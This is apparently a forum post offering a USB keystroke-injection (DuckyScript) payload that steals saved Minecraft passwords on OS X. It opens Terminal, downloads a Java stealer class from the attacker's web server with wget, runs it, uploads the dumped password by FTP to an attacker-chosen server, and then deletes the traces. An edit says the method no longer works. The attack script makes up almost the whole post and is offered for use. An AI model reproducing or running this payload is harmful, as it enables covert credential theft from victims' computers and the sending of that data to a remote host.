This is a payload for all of the gamers that dumps the minecraft password and sends it via ftp to the server of your choice.  Works only on OS X because there aren't a whole lot of practical uses for this other than to prove how insecure some games are. Requires a web server, and an ftp server. You need to host [this file](https://app.box.com/s/3svc1gvulsqrtusj4eqg) on the root of the webserver (do not change the name or else it won't run)
**Edit:** No longer works due to authentication method change.  Still an interesting concept though


    REM Author: Jesse Wallace
    REM Title: Minecraft Password Grabber
    REM This payload dumps the minecraft password and uploads it via ftp.
    REM Fill in all of the information for your server below
    DELAY 1000
    GUI SPACE
    STRING terminal
    DELAY 500
    ENTER
    DELAY 4000
    STRING wget WEBSERVER/mcsteal.class
    ENTER
    DELAY 500
    STRING java mcsteal >> lastlogin.txt
    ENTER
    DELAY 300
    STRING ftp -i FTPSERVER
    ENTER
    DELAY 800
    STRING USERNAME
    ENTER
    STRING PASSWORD   
    ENTER
    DELAY 400
    STRING send
    ENTER
    DELAY 100
    STRING lastlogin.txt
    ENTER
    STRING minecraftpassword.txt
    ENTER
    DELAY 1000
    STRING exit
    ENTER
    DELAY 200
    STRING rm -rf lastlogin.txt mcsteal.class
    ENTER
    DELAY 100
    STRING exit
    ENTER